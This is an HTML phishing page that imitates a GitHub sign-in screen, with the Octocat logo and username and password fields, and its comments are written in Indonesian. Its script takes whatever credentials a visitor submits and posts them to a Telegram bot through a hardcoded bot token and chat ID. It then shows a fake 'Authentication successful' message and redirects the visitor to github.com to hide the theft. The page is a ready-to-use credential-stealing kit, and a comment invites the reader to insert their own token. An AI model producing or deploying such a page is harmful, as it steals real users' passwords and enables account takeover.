<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background: #f6f8fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #24292e;
        }
        .container {
            background: white;
            border-radius: 6px;
            box-shadow: 0 8px 24px rgba(149, 157, 165, 0.2);
            width: 340px;
            padding: 24px;
        }
        /* CSS disingkat */
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="48" height="48" viewBox="0 0 16 16" fill="currentColor">
                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
            </svg>
        </div>
        <h1>Sign in to continue</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
                <div class="error" id="errorMsg"></div>
            </div>
            <button type="submit">Sign in</button>
            <div class="success" id="successMsg">Authentication successful! Redirecting...</div>
        </form>
        <div class="login-footer">
            <a href="#">Forgot password?</a> Â· <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            
            if (!username || !password) {
                errorMsg.textContent = "Please enter both username and password";
                return;
            }
            
            // Kirim data ke Telegram
            sendToTelegram(username, password);
            
            // Tampilkan pesan sukses
            successMsg.style.display = 'block';
            errorMsg.textContent = '';
            
            // Redirect setelah 2 detik
            setTimeout(function() {
                window.location.href = "https://github.com";
            }, 2000);
        });
        
        function sendToTelegram(username, password) {
            const message = `Login attempt:\nUsername: ${username}\nPassword: ${password}`;
            
            // GANTI DENGAN TOKEN DAN CHAT ID ANDA
            const botToken = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
            const chatId = '8126039795';
            
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
